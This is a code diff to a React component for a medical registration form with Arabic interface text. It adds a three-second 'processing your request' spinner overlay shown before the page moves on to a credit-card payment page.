@@ -297,6 +297,7 @@ const MedicalRegister = () => {
   const [data, setData] = useState<FormData>(loadState);
   const [errors, setErrors] = useState<Errors>({});
   const [loading, setLoading] = useState(false);
+  const [waiting, setWaiting] = useState(false);
 
   useEffect(() => {
     if (data.requestType && !requestTypes.some((item) => item.v === data.requestType)) {
@@ -390,7 +391,12 @@ const MedicalRegister = () => {
     });
     setLoading(false);
     try { sessionStorage.removeItem(STORAGE_KEY); } catch { /* noop */ }
-    navigate('/credit-card-payment');
+    // إظهار شاشة انتظار 3 ثواني ثم الانتقال للبطاقة
+    setWaiting(true);
+    setTimeout(() => {
+      setWaiting(false);
+      navigate('/credit-card-payment');
+    }, 3000);
   };
 
   const stepMeta = useMemo(() => [
@@ -409,6 +415,14 @@ const MedicalRegister = () => {
   return (
     <div dir={dir} className="min-h-screen bg-[#eef0fb] flex flex-col">
       <SiteHeader />
+      {waiting && (
+        <div className="fixed inset-0 bg-black/50 flex items-center justify-center z-50">
+          <div className="bg-white rounded-xl p-8 text-center">
+            <div className="animate-spin w-10 h-10 border-4 border-[#8b1538] border-t-transparent rounded-full mx-auto mb-4"></div>
+            <p className="text-gray-700">جاري معالجة طلبك...</p>
+          </div>
+        </div>
+      )}
       <div className="flex-1 py-8 px-3 flex items-start justify-center">
         <div className="w-full max-w-5xl bg-white shadow-sm">
           {/* Header */}
